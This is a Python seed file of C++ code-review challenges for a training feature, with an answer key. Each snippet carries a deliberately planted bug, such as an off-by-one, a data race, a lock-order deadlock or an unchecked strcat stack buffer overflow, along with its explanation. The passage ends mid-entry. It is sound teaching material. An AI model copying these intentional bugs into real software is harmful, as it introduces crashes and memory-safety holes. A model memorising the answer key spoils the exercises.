"""
Seed content for Code Review challenges (see models.CodeReviewChallenge,
routers/code_review.py): a longer snippet (~20-30 lines), each seeded with
1-3 real bugs or code smells pulled from well-known categories (off-by-one,
dangling references, XSS, race conditions, etc). Objectively graded: the
user clicks the line(s) they think are buggy, then matches each flagged
line to a reason from an answer bank (the real reasons for every issue in
the snippet, padded with plausible decoys) - see routers/code_review.py for
the grading logic.

Snippets are authored with inline `marker` tokens (e.g. "\u2021bug1\u2021") on the
line each issue lives on, rather than hand-counted line numbers - _build()
below locates each marker, records its 1-indexed line number, and strips the
marker out of the snippet text before it's ever seeded/served. This keeps
authoring safe against off-by-one mistakes when snippets get edited.

Two entries per difficulty tier per track (matches this track's weekday
cadence - see config.WEEKDAY_DIFFICULTY); expand over time the same way the
other content banks have.
"""
import re


def _build(snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    """issues: [{"marker": "...", "reason": "...", "explanation": "..."}, ...]
    Returns {"snippet": <marker-free>, "issues": [{"line", "reason", "explanation"}, ...],
    "distractor_reasons": [...]}."""
    lines = snippet.split("\n")
    built_issues = []
    for spec in issues:
        marker = spec["marker"]
        for i, line in enumerate(lines):
            if marker in line:
                built_issues.append({"line": i + 1, "reason": spec["reason"], "explanation": spec["explanation"]})
                lines[i] = re.sub(r"\s*" + re.escape(marker), "", line)
                break
        else:
            raise ValueError(f"marker {marker!r} not found in snippet")
    return {
        "snippet": "\n".join(lines),
        "issues": built_issues,
        "distractor_reasons": distractor_reasons,
    }


def _entry(difficulty: str, topic: str, title: str, snippet: str, issues: list[dict], distractor_reasons: list[str]) -> dict:
    return {
        "difficulty": difficulty,
        "topic": topic,
        "title": title,
        **_build(snippet, issues, distractor_reasons),
    }


CODE_REVIEW_CHALLENGES = {
    "cpp_core": [
        _entry(
            "easy", "Loops & Bounds", "Sum an Array",
            "#include <vector>\n"
            "#include <string>\n"
            "\n"
            "// Computes the average of a batch of order totals for the\n"
            "// daily summary report.\n"
            "double average(const std::vector<double>& values) {\n"
            "    double sum = 0;\n"
            "    for (int i = 0; i <= values.size(); i++) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        sum += values[i];\n"
            "    }\n"
            "    return sum / values.size();\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<double> orderTotals = {19.99, 42.50, 7.25, 100.00};\n"
            "    double avg = average(orderTotals);\n"
            "    printf(\"Average order total: %.2f\\n\", avg);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Off-by-one bounds error",
                "explanation": (
                    "`i <= values.size()` runs one iteration too many, so on the last pass `values[i]` reads one "
                    "element past the end of the vector - undefined behavior (`vector::size()` returns a `size_t`, "
                    "so `i` implicitly converts, but the real bug is the `<=`). Should be `i < values.size()`."
                ),
            }],
            ["Unused variable", "Missing const correctness", "Redundant copy instead of reference"],
        ),
        _entry(
            "easy", "Floating Point", "Price Comparison",
            "#include <vector>\n"
            "\n"
            "struct CartItem {\n"
            "    std::string name;\n"
            "    double price;\n"
            "};\n"
            "\n"
            "// Free shipping kicks in once the order crosses $50.\n"
            "bool isFreeShipping(const std::vector<CartItem>& cart) {\n"
            "    double threshold = 50.00;\n"
            "    double total = 0;\n"
            "    for (const auto& item : cart) {\n"
            "        total += item.price;\n"
            "    }\n"
            "    return total == threshold;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<CartItem> cart = {{\"Boots\", 19.99}, {\"Socks\", 15.01}, {\"Laces\", 15.00}};\n"
            "    bool free = isFreeShipping(cart);\n"
            "    printf(\"Free shipping: %s\\n\", free ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Comparing floats with ==",
                "explanation": (
                    "Comparing floating-point values with `==` - accumulated rounding error means `total` is almost "
                    "never exactly `50.00` even when the math 'should' work out, so this silently returns false when "
                    "it shouldn't. Compare with a small epsilon tolerance, or better, do money math in integer cents."
                ),
            }],
            ["Missing include guard", "Magic number should be a named constant", "Unnecessary heap allocation"],
        ),
        _entry(
            "medium", "Lifetimes", "Dangling Reference",
            "#include <string>\n"
            "\n"
            "// Used by the log formatter to grab a quick label for the\n"
            "// first word of a request line.\n"
            "const std::string& firstWord(const std::string& sentence) {\n"
            "    std::string word = sentence.substr(0, sentence.find(' '));  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    return word;\n"
            "}\n"
            "\n"
            "void logRequestLine(const std::string& line) {\n"
            "    const std::string& tag = firstWord(line);\n"
            "    printf(\"[%s] %s\\n\", tag.c_str(), line.c_str());\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    logRequestLine(\"GET /api/orders HTTP/1.1\");\n"
            "    logRequestLine(\"POST /api/checkout HTTP/1.1\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Dangling reference to a local",
                "explanation": (
                    "`firstWord` returns a reference to `word`, a local variable destroyed the moment the function "
                    "returns - the caller ends up with a dangling reference to freed memory, undefined behavior on "
                    "first use. Either return `std::string` by value (RVO/move makes this cheap) or take an output "
                    "parameter - never return a reference to a local."
                ),
            }],
            ["Unused variable", "Inconsistent naming convention", "Missing const correctness"],
        ),
        _entry(
            "medium", "RAII", "Leaky Parser",
            "#include <string>\n"
            "\n"
            "struct Request {\n"
            "    explicit Request(const std::string& raw) : raw_(raw) {}\n"
            "    bool isValid() const { return !raw_.empty(); }\n"
            "    std::string raw_;\n"
            "};\n"
            "\n"
            "void logError(const std::string& msg);\n"
            "void process(Request* req);\n"
            "\n"
            "void handleRequest(const std::string& raw) {\n"
            "    Request* req = new Request(raw);\n"
            "    if (!req->isValid()) {\n"
            "        logError(\"bad request\");\n"
            "        return;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "    process(req);\n"
            "    delete req;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    handleRequest(\"\");\n"
            "    handleRequest(\"GET /health\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Memory leak on early return",
                "explanation": (
                    "If `isValid()` is false, the function returns without ever calling `delete req` - a leak. It "
                    "also leaks if `process(req)` throws, since `delete req` never runs on that path either. Fix by "
                    "using `std::unique_ptr<Request>` so cleanup happens automatically via RAII on every exit path, "
                    "instead of manual `new`/`delete`."
                ),
            }],
            ["No self-assignment check", "Public data member instead of encapsulated", "Dangling reference to a local"],
        ),
        _entry(
            "hard", "Concurrency", "Shared Counter",
            "#include <thread>\n"
            "#include <vector>\n"
            "\n"
            "// requestCount is read by a background reporter thread and\n"
            "// incremented once per request across a pool of worker threads.\n"
            "int requestCount = 0;\n"
            "\n"
            "void onRequestHandled() {\n"
            "    requestCount++;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "void worker(int requestsToHandle) {\n"
            "    for (int i = 0; i < requestsToHandle; i++) {\n"
            "        onRequestHandled();\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<std::thread> pool;\n"
            "    for (int i = 0; i < 8; i++) {\n"
            "        pool.emplace_back(worker, 10000);\n"
            "    }\n"
            "    for (auto& t : pool) t.join();\n"
            "    printf(\"total requests: %d\\n\", requestCount);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Data race on shared state",
                "explanation": (
                    "`requestCount++` is a read-modify-write that isn't atomic, and 8 worker threads call it "
                    "concurrently with no synchronization - increments can be lost (two threads read the same value "
                    "before either writes back), and it's technically undefined behavior in C++ (unsynchronized "
                    "concurrent access to a non-atomic variable with at least one write). Fix with `std::atomic<int>` "
                    "or a mutex guarding the increment."
                ),
            }],
            ["Uninitialized variable used", "Unused variable", "Iterator invalidated after erase"],
        ),
        _entry(
            "hard", "Iterators", "Remove Expired Entries",
            "#include <vector>\n"
            "\n"
            "struct Session {\n"
            "    bool isExpired() const;\n"
            "    std::string id;\n"
            "};\n"
            "\n"
            "// Runs on a timer every minute to sweep out expired sessions.\n"
            "void removeExpired(std::vector<Session>& sessions) {\n"
            "    for (auto it = sessions.begin(); it != sessions.end(); ++it) {\n"
            "        if (it->isExpired()) {\n"
            "            sessions.erase(it);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        }\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<Session> sessions = {\n"
            "        {\"s1\"}, {\"s2\"}, {\"s3\"}, {\"s4\"},\n"
            "    };\n"
            "    removeExpired(sessions);\n"
            "    printf(\"sessions remaining: %zu\\n\", sessions.size());\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Iterator invalidated after erase",
                "explanation": (
                    "`vector::erase(it)` invalidates `it` and every iterator after it, but the loop's `++it` then "
                    "advances the now-dangling iterator anyway - undefined behavior (and if it happens to 'work', it "
                    "silently skips the element right after every erased one). `erase` returns the next valid "
                    "iterator - assign it back (`it = sessions.erase(it);`) and only `++it` in the non-erase branch, "
                    "or use the erase-remove idiom instead."
                ),
            }],
            ["Off-by-one bounds error", "Memory leak on early return", "Missing const correctness"],
        ),
        _entry(
            "expert", "Rule of Three", "Copy Assignment",
            "#include <cstring>\n"
            "\n"
            "class Buffer {\n"
            "public:\n"
            "    Buffer(size_t len) : len_(len), data_(new char[len]) {}\n"
            "    ~Buffer() { delete[] data_; }\n"
            "\n"
            "    Buffer& operator=(const Buffer& other) {\n"
            "        delete[] data_;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        len_ = other.len_;\n"
            "        data_ = new char[len_];\n"
            "        memcpy(data_, other.data_, len_);\n"
            "        return *this;\n"
            "    }\n"
            "\n"
            "private:\n"
            "    size_t len_;\n"
            "    char* data_;\n"
            "};\n"
            "\n"
            "int main() {\n"
            "    Buffer b(16);\n"
            "    b = b;  // self-assignment\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "No self-assignment check",
                "explanation": (
                    "`b = b;` first does `delete[] data_`, freeing the buffer - but `other` *is* `*this`, so "
                    "`other.data_`/`other.len_` are now reading freed memory before the copy even starts, and "
                    "`memcpy` copies garbage into a freshly-allocated buffer. Guard with `if (this == &other) return "
                    "*this;` at the top, or use the copy-and-swap idiom, which sidesteps the problem entirely."
                ),
            }],
            ["Object slicing via pass-by-value", "Data race on shared state", "Integer overflow"],
        ),
        _entry(
            "expert", "Polymorphism", "Process a Shape",
            "#include <iostream>\n"
            "\n"
            "class Shape {\n"
            "public:\n"
            "    virtual double area() const { return 0.0; }\n"
            "    virtual ~Shape() = default;\n"
            "};\n"
            "\n"
            "class Circle : public Shape {\n"
            "public:\n"
            "    explicit Circle(double r) : r_(r) {}\n"
            "    double area() const override { return 3.14159 * r_ * r_; }\n"
            "private:\n"
            "    double r_;\n"
            "};\n"
            "\n"
            "void logArea(Shape shape) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::cout << \"area: \" << shape.area() << \"\\n\";\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Circle c(5.0);\n"
            "    logArea(c);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Object slicing via pass-by-value",
                "explanation": (
                    "`logArea` takes `Shape` by value, so passing a `Circle` copies only the `Shape` base-class "
                    "portion into a new, plain `Shape` object - `shape.area()` calls `Shape::area()`, not the "
                    "overridden `Circle::area()`, even though `area()` is virtual. Polymorphism through a by-value "
                    "parameter never works; take `const Shape&` (or a pointer) instead so the virtual call dispatches "
                    "correctly."
                ),
            }],
            ["No self-assignment check", "Missing const correctness", "Unused variable"],
        ),
        _entry(
            "easy", "Uninitialized State", "Retry Budget",
            "#include <cstdio>\n"
            "\n"
            "// Attempts to reconnect to the order queue, giving up after a\n"
            "// few tries.\n"
            "bool connectWithRetry(int maxAttempts) {\n"
            "    bool connected;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    int attempt = 0;\n"
            "    while (!connected && attempt < maxAttempts) {\n"
            "        connected = (attempt % 3 == 0);  // stand-in for a real connect() call\n"
            "        attempt++;\n"
            "    }\n"
            "    return connected;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"connected: %s\\n\", connectWithRetry(5) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Uninitialized variable used",
                "explanation": (
                    "`bool connected;` has no initializer, so its value is indeterminate before the loop's first "
                    "`!connected` check reads it - technically undefined behavior, and in practice the loop's first "
                    "iteration decision depends on garbage stack memory instead of a known starting state. Initialize "
                    "it explicitly: `bool connected = false;`."
                ),
            }],
            ["Off-by-one bounds error", "Data race on shared state", "Missing const correctness"],
        ),
        _entry(
            "easy", "Const Correctness", "Order Total",
            "#include <vector>\n"
            "\n"
            "struct LineItem {\n"
            "    double price;\n"
            "    int quantity;\n"
            "};\n"
            "\n"
            "// Called on every render of the cart summary, so it runs often.\n"
            "double orderTotal(std::vector<LineItem> items) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    double total = 0;\n"
            "    for (const auto& item : items) {\n"
            "        total += item.price * item.quantity;\n"
            "    }\n"
            "    return total;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<LineItem> cart = {{9.99, 2}, {24.50, 1}};\n"
            "    printf(\"total: %.2f\\n\", orderTotal(cart));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Redundant copy instead of reference",
                "explanation": (
                    "`items` is taken by value, so every call deep-copies the entire vector of LineItems just to read "
                    "from it - wasted allocation and copying on a function that's read-only and 'runs often' per the "
                    "comment. Take `const std::vector<LineItem>&` instead: no copy, and `const` documents that the "
                    "function doesn't modify the cart."
                ),
            }],
            ["Uninitialized variable used", "Dangling reference to a local", "Integer overflow"],
        ),
        _entry(
            "medium", "Smart Pointers", "Manual Cleanup",
            "#include <memory>\n"
            "\n"
            "struct Connection {\n"
            "    void close();\n"
            "};\n"
            "\n"
            "void releaseEarly(std::unique_ptr<Connection>& conn, bool forceClose) {\n"
            "    if (forceClose) {\n"
            "        conn->close();\n"
            "        delete conn.get();  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    auto conn = std::make_unique<Connection>();\n"
            "    releaseEarly(conn, true);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Manual delete of a unique_ptr-owned resource",
                "explanation": (
                    "`conn` is a `std::unique_ptr` - it already owns the Connection and will `delete` it "
                    "automatically when it goes out of scope. Calling `delete conn.get()` manually frees the same "
                    "object a second time when `conn`'s own destructor later runs (double free, undefined behavior). "
                    "If early release is genuinely needed, call `conn.reset()`, which safely deletes and nulls the "
                    "pointer in one step - never mix manual `delete` with a smart pointer that already owns the object."
                ),
            }],
            ["No self-assignment check", "Off-by-one bounds error", "Iterator invalidated after erase"],
        ),
        _entry(
            "medium", "STL Algorithms", "Sort by Priority",
            "#include <algorithm>\n"
            "#include <vector>\n"
            "\n"
            "struct Ticket {\n"
            "    int priority;\n"
            "};\n"
            "\n"
            "void sortByPriority(std::vector<Ticket>& tickets) {\n"
            "    std::sort(tickets.begin(), tickets.end(), [](const Ticket& a, const Ticket& b) {\n"
            "        return a.priority <= b.priority;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    });\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    std::vector<Ticket> tickets = {{3}, {1}, {2}, {1}};\n"
            "    sortByPriority(tickets);\n"
            "    printf(\"lowest priority: %d\\n\", tickets.front().priority);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Invalid comparator (not strict weak ordering)",
                "explanation": (
                    "`std::sort`'s comparator must implement strict-weak-ordering: it needs `comp(a, b)` to be false "
                    "whenever `a` and `b` are equivalent, but `<=` returns true for equal elements. This violates the "
                    "contract `std::sort` relies on internally and is undefined behavior - real implementations can "
                    "crash, infinite-loop, or produce a corrupted (not fully sorted) result, especially with elements "
                    "that compare equal. Use `<`, not `<=`."
                ),
            }],
            ["Off-by-one bounds error", "Unused variable", "Data race on shared state"],
        ),
        _entry(
            "hard", "Move Semantics", "Forward the Payload",
            "#include <string>\n"
            "#include <utility>\n"
            "\n"
            "struct Message {\n"
            "    std::string payload;\n"
            "};\n"
            "\n"
            "void enqueue(Message msg);\n"
            "\n"
            "void sendTwice(Message msg) {\n"
            "    enqueue(std::move(msg));\n"
            "    printf(\"echo: %s\\n\", msg.payload.c_str());  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    sendTwice(Message{\"hello\"});\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Use-after-move",
                "explanation": (
                    "`std::move(msg)` casts `msg` to an rvalue so `enqueue` can steal its resources - after that "
                    "call, `msg` is left in a valid-but-unspecified state (for std::string, likely empty, but that's "
                    "not guaranteed by the standard for user types). Reading `msg.payload` afterward for a real value "
                    "is a bug even though it won't crash: the object was explicitly signaled as 'about to be "
                    "discarded', so its post-move contents shouldn't be relied on for anything but reassignment or "
                    "destruction."
                ),
            }],
            ["Object slicing via pass-by-value", "Missing const correctness", "Integer overflow"],
        ),
        _entry(
            "hard", "Exception Safety", "Batch Loader",
            "#include <vector>\n"
            "\n"
            "struct Record { int id; };\n"
            "Record* parseRecord(const std::string& line);  // throws std::runtime_error on bad input\n"
            "\n"
            "std::vector<Record*> loadBatch(const std::vector<std::string>& lines) {\n"
            "    std::vector<Record*> records;\n"
            "    for (const auto& line : lines) {\n"
            "        Record* r = new Record(*parseRecord(line));  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        records.push_back(r);\n"
            "    }\n"
            "    return records;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    loadBatch({\"id=1\", \"corrupt\", \"id=3\"});\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Resource leak on exception",
                "explanation": (
                    "If `parseRecord` throws partway through the loop (on the \"corrupt\" line), every `Record*` "
                    "already `new`'d and pushed into `records` on earlier iterations is leaked - the exception "
                    "unwinds past `records.push_back` calls and the local `records` vector's destruction only frees "
                    "the vector's own storage, not the raw pointers it holds. Store `std::unique_ptr<Record>` (or "
                    "avoid heap allocation entirely and store `Record` by value) so cleanup happens automatically "
                    "during unwinding regardless of where an exception is thrown."
                ),
            }],
            ["No self-assignment check", "Public data member instead of encapsulated", "Invalid comparator (not strict weak ordering)"],
        ),
        _entry(
            "expert", "Concurrency", "Transfer Between Accounts",
            "#include <mutex>\n"
            "\n"
            "struct Account {\n"
            "    std::mutex m;\n"
            "    double balance;\n"
            "};\n"
            "\n"
            "void transfer(Account& from, Account& to, double amount) {\n"
            "    std::lock_guard<std::mutex> lockFrom(from.m);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::lock_guard<std::mutex> lockTo(to.m);\n"
            "    from.balance -= amount;\n"
            "    to.balance += amount;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Account a{{}, 100.0}, b{{}, 50.0};\n"
            "    transfer(a, b, 25.0);\n"
            "    transfer(b, a, 10.0);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Lock ordering deadlock",
                "explanation": (
                    "`transfer` always locks `from` then `to`, in whatever order the caller passes them. If thread 1 "
                    "calls `transfer(a, b, ...)` (locks a, then wants b) at the same moment thread 2 calls "
                    "`transfer(b, a, ...)` (locks b, then wants a), each thread holds the lock the other is waiting "
                    "for - permanent deadlock. Fix by always acquiring locks in a consistent global order regardless "
                    "of call-site argument order (e.g. compare account addresses/ids and lock the lower one first), "
                    "or use `std::lock`/`std::scoped_lock` with both mutexes at once, which handles ordering safely "
                    "for you."
                ),
            }],
            ["Data race on shared state", "Use-after-move", "Manual delete of a unique_ptr-owned resource"],
        ),
        _entry(
            "easy", "Integer Division", "Discount Percentage",
            "#include <cstdio>\n"
            "\n"
            "// Shows what percentage of the order the discount saved,\n"
            "// rounded down to a whole percent for the receipt line.\n"
            "int discountPercent(int discountCents, int totalCents) {\n"
            "    return discountCents / totalCents * 100;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"saved: %d%%\\n\", discountPercent(500, 2000));\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Integer division truncates result",
                "explanation": (
                    "`discountCents / totalCents` is integer division that truncates toward zero before the "
                    "`* 100` ever runs - for 500/2000 that's `0 * 100 = 0`, always reporting 0% unless the "
                    "discount happens to be >= the total. Multiply by 100 first (`discountCents * 100 / "
                    "totalCents`) so the division happens on the already-scaled value instead of losing the "
                    "fraction up front."
                ),
            }],
            ["Off-by-one bounds error", "Comparing floats with ==", "Uninitialized variable used"],
        ),
        _entry(
            "easy", "String Handling", "Build a Log Line",
            "#include <cstring>\n"
            "#include <cstdio>\n"
            "\n"
            "// Formats \"[LEVEL] message\" into a small fixed buffer for a\n"
            "// lightweight embedded-style logger.\n"
            "void logLine(const char* level, const char* message) {\n"
            "    char buf[32];  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    strcpy(buf, \"[\");\n"
            "    strcat(buf, level);\n"
            "    strcat(buf, \"] \");\n"
            "    strcat(buf, message);\n"
            "    printf(\"%s\\n\", buf);\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    logLine(\"ERROR\", \"failed to connect to the order queue after 3 retries\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Fixed buffer overflow from unchecked strcat",
                "explanation": (
                    "`buf` is a fixed 32-byte stack buffer, but `strcat` keeps appending with no bounds "
                    "checking - a long enough `level`/`message` (like the actual call in `main`) overflows past "
                    "the end of `buf`, corrupting adjacent stack memory (undefined behavior, and a classic "
                    "stack-smashing bug class). Use `std::string` and `+`/`+=`, or a bounds-checked formatter "
                    "like `snprintf`, instead of fixed-size buffers with unchecked C string functions."
                ),
            }],
            ["Redundant copy instead of reference", "Missing const correctness", "Integer division truncates result"],
        ),
        _entry(
            "easy", "Boolean Logic", "Is Weekend",
            "#include <cstdio>\n"
            "\n"
            "// day: 0=Sunday ... 6=Saturday. Used to decide whether weekend\n"
            "// shipping surcharges apply.\n"
            "bool isWeekend(int day) {\n"
            "    if (day = 6) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "        return true;\n"
            "    }\n"
            "    return day == 0;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"Wednesday is weekend: %s\\n\", isWeekend(3) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Assignment instead of comparison in condition",
                "explanation": (
                    "`day = 6` is a single `=` (assignment), not `==` (comparison) - it overwrites `day` with 6 "
                    "and then evaluates the condition as \"is 6 truthy\", which is always true, so `isWeekend` "
                    "returns true for every input regardless of the actual day. This compiles cleanly with no "
                    "warning on many setups, which is exactly why it's a classic bug - should be `if (day == 6)`."
                ),
            }],
            ["Off-by-one bounds error", "Uninitialized variable used", "Data race on shared state"],
        ),
        _entry(
            "easy", "Null Checks", "Reading Config",
            "#include <cstdio>\n"
            "\n"
            "struct Config { int maxRetries; };\n"
            "Config* loadConfig(const char* path);  // returns nullptr if the file is missing\n"
            "\n"
            "// Called once at startup to report the configured retry limit.\n"
            "void printRetryLimit(const char* path) {\n"
            "    Config* cfg = loadConfig(path);\n"
            "    printf(\"max retries: %d\\n\", cfg->maxRetries);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printRetryLimit(\"config.ini\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Missing null check before dereference",
                "explanation": (
                    "`loadConfig` is documented to return `nullptr` when the file is missing, but "
                    "`printRetryLimit` dereferences `cfg->maxRetries` unconditionally - if the config file isn't "
                    "found, this dereferences a null pointer, undefined behavior (a crash on most platforms, but "
                    "not guaranteed to be one). Check `if (!cfg) { ...handle it...; return; }` before using it."
                ),
            }],
            ["Redundant copy instead of reference", "Memory leak on early return", "Missing const correctness"],
        ),
        _entry(
            "easy", "Integer Overflow", "Order Quantity Limit",
            "#include <cstdio>\n"
            "\n"
            "// Rejects an order line if the total cost (price in cents times\n"
            "// quantity) exceeds the per-line spending cap.\n"
            "bool exceedsLimit(short priceCents, short quantity, int limitCents) {  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    short totalCents = priceCents * quantity;\n"
            "    return totalCents > limitCents;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    printf(\"exceeds: %s\\n\", exceedsLimit(1999, 50, 100000) ? \"yes\" : \"no\");\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Integer overflow from narrow type multiplication",
                "explanation": (
                    "`priceCents * quantity` multiplies two `short`s (max ~32767) and stores the result back "
                    "into a `short totalCents` - 1999 * 50 = 99,950, which already overflows a 16-bit signed "
                    "short (wraps to a negative/garbage value), so the comparison against `limitCents` can be "
                    "silently wrong in either direction. Use a wide enough type (`int`/`long`) for the "
                    "multiplication and the result, especially for money math where even 'small' per-unit values "
                    "multiply up fast."
                ),
            }],
            ["Comparing floats with ==", "Off-by-one bounds error", "Missing null check before dereference"],
        ),
        _entry(
            "medium", "Encapsulation", "Account Balance",
            "#include <cstdio>\n"
            "\n"
            "// A simple account model used by the ledger service.\n"
            "struct Account {\n"
            "    double balance;  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "};\n"
            "\n"
            "void applyInterest(Account& acct, double rate) {\n"
            "    acct.balance *= (1.0 + rate);\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    Account a{1000.0};\n"
            "    a.balance = -50000.0;  // some other part of the codebase, months later\n"
            "    applyInterest(a, 0.02);\n"
            "    printf(\"balance: %.2f\\n\", a.balance);\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Public data member instead of encapsulated",
                "explanation": (
                    "`balance` is a public field, so any code anywhere in the program (like the direct "
                    "assignment in `main`) can set it to an arbitrary, unvalidated value with no chance for "
                    "`Account` to enforce its own invariants (no negative balances, audit logging on change, "
                    "etc). Make it private with a `deposit`/`withdraw` (or at minimum a validating `setBalance`) "
                    "API, so every mutation goes through code that can actually enforce the account's rules."
                ),
            }],
            ["No self-assignment check", "Missing const correctness", "Dangling reference to a local"],
        ),
        _entry(
            "medium", "Copy Semantics", "Build a Batch",
            "#include <string>\n"
            "#include <vector>\n"
            "\n"
            "struct Order {\n"
            "    std::string customerId;\n"
            "    std::vector<int> itemIds;\n"
            "};\n"
            "\n"
            "// Builds a batch of orders to hand off to the fulfillment service.\n"
            "std::vector<Order> buildBatch(const std::vector<std::string>& customerIds) {\n"
            "    std::vector<Order> batch;\n"
            "    for (const auto& id : customerIds) {\n"
            "        Order o;\n"
            "        o.customerId = id;\n"
            "        o.itemIds = {101, 102, 103};\n"
            "        batch.push_back(o);  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    }\n"
            "    return batch;\n"
            "}\n"
            "\n"
            "int main() {\n"
            "    auto batch = buildBatch({\"c1\", \"c2\", \"c3\"});\n"
            "    printf(\"batch size: %zu\\n\", batch.size());\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Unnecessary copy instead of emplace/move",
                "explanation": (
                    "`batch.push_back(o)` copies the local `Order` `o` (including deep-copying its "
                    "`std::string` and `std::vector` members) into the vector, even though `o` is a local about "
                    "to go out of scope and is never used again afterward. `batch.push_back(std::move(o))` (or "
                    "building the `Order` in place with `batch.emplace_back(...)`) avoids that redundant "
                    "deep-copy by moving/constructing directly instead - not a correctness bug, but a real, easy "
                    "to avoid performance cost that compounds with every element of a growing batch."
                ),
            }],
            ["Iterator invalidated after erase", "Dangling reference to a local", "Redundant copy instead of reference"],
        ),
        _entry(
            "medium", "Initialization Order", "Global Logger Setup",
            "#include <string>\n"
            "\n"
            "// logger.cpp\n"
            "struct Logger {\n"
            "    std::string prefix;\n"
            "};\n"
            "Logger globalLogger{\"[app] \"};\n"
            "\n"
            "// metrics.cpp - a SEPARATE translation unit\n"
            "extern Logger globalLogger;\n"
            "struct Metrics {\n"
            "    Metrics() { tag = globalLogger.prefix + \"metrics\"; }  \xe2\x80\xa1bug1\xe2\x80\xa1\n"
            "    std::string tag;\n"
            "};\n"
            "Metrics globalMetrics;\n"
            "\n"
            "int main() {\n"
            "    printf(\"%s\\n\", globalMetrics.tag.c_str());\n"
            "    return 0;\n"
            "}\n",
            [{
                "marker": "\xe2\x80\xa1bug1\xe2\x80\xa1",
                "reason": "Static initialization order fiasco across translation units",
                "explanation": (
